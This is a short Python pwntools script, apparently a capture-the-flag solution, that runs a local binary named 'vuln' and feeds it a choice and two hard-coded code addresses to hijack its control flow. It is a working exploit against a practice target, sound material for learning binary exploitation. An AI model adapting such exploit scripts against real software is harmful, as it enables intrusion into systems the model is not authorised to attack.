from pwn import *

p = process('./vuln')
e = ELF('./vuln')

p.sendline(b'y')
p.sendline(b'0x004012b6')
p.sendline(b'0x0040126e')
print(p.recvall())
